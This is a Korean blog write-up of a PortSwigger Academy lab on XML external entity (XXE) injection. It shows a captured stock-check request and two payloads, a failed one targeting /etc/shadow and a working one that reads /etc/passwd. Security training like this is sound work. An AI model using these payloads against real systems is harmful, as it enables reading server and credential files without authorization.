---
layout: post
title: "Burp Academy 문제풀이 - Exploiting XXE using external entities to retrieve files"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XXE]
toc: true
---

# 개요
- 문제명: Exploiting XXE using external entities to retrieve files
- XXE (XML external entity) 공격에 대한 실습 문제이다. 
- XXE의 기본적인 패턴 중 하나의 시스템 파일 읽기를 실습할 수 있다. 
- 주소: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
- 난이도: APPRENTICE (쉬움)
- XXE에 대한 기본적인 내용은 [여기](https://portswigger.net/web-security/xxe){:target="_blank"} 에서 확인가능하다. 


# 문제분석
- Check stock 기능은 XML 입력을 파싱한 결과를 (에러를 포함해서) 돌려준다고 한다. 
- XML external entity 공격 페이로드를 삽입해서 /etc/passwd 파일의 내용을 읽으면 문제가 풀린다.

```
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.
```

# 풀이 
## 취약점이 있는 곳 찾기
상품 상세 페이지에서 `Check stock` 버튼이 있는 것을 찾았다. 

![Check stock기능](/images/burp-academy-xxe-1-1.png)

버튼을 클릭하면 다음 요청이 전송된다. 

```http
POST /product/stock HTTP/1.1
Host: 0a52000f032ecba6c08c8b1900120054.web-security-academy.net
Cookie: session=1uOtwtnBX2Udo4b3VfYEXUpYiZuR7xja
Content-Length: 107
Sec-Ch-Ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: https://0a52000f032ecba6c08c8b1900120054.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a52000f032ecba6c08c8b1900120054.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7onnection: close

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```

HTTP 응답은 다음과 같다. 

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 2

94
```

POST 요청의 XML 바디 부분에 XXE 공격 페이로드를 넣으면 될 것 같다. 

## 1차 시도 
[XXE 페이로드](https://github.com/payloadbox/xxe-injection-payload-list){:target="_blank"}
를 참고해서 
`<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>` 를 추가해서 보내봤다. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY foo SYSTEM "file:///etc/shadow"> ]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

200 응답이 되돌아왔다. 뭔가 잘못된 것 같다. 

## 2차 시도 
아, 페이로드에 `&foo;` 로 출력해주는 부분이 없었다. 다음 페이로드로 시도해보자 /etc/passwd의 내용을 확인할 수 있었다. 

```xml
<!DOCTYPE test [<!ENTITY foo SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&foo;</productId>
    <storeId>1</storeId>
</stockCheck>
```

Burp Suite Repeater로 확인한 모습 
![Check stock기능](/images/burp-academy-xxe-1-3.png)

성공! 
![Check stock기능](/images/burp-academy-xxe-1-2.png)